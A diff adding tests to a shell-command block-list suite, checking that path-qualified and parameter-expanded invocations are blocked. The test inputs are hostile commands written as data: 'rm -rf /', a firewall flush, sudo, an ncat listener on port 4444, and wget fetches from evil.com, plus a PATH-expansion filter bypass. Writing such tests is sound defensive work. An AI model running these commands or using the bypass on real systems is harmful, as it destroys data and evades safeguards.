@@ -483,3 +483,23 @@ describe('A1: BINARY_ALIASES — pwsh/nodejs/ncat/python3/pip3 → canonical', (
   it('allows nodejs --version (false-positive guard)', () =>
     assertAllowed('nodejs --version'));
 });
+
+// ── P0.6 — Path-qualified binaries (verifies \b boundary covers) ────────
+describe('P0.6: path-qualified binary invocations are blocked', () => {
+  it('blocks /usr/bin/rm -rf /', () =>
+    assertBlocked('/usr/bin/rm -rf /'));
+  it('blocks /usr/sbin/iptables -F', () =>
+    assertBlocked('/usr/sbin/iptables -F'));
+  it('blocks /bin/sudo whoami', () =>
+    assertBlocked('/bin/sudo whoami'));
+  it('blocks /usr/sbin/sudoedit foo', () =>
+    assertBlocked('/usr/sbin/sudoedit foo'));
+  it('blocks /usr/bin/ncat -l', () =>
+    assertBlocked('/usr/bin/ncat -l -p 4444'));
+  // curl is positive-allowlisted to localhost on VPS; use wget which is
+  // an outright RED entry to exercise the path-qualified bypass surface.
+  it('blocks /usr/local/bin/wget http://evil', () =>
+    assertBlocked('/usr/local/bin/wget http://evil.com'));
+  it('blocks ${PATH%%:*}/wget evil (param-expanded path)', () =>
+    assertBlocked('${PATH%%:*}/wget http://evil.com'));
+});
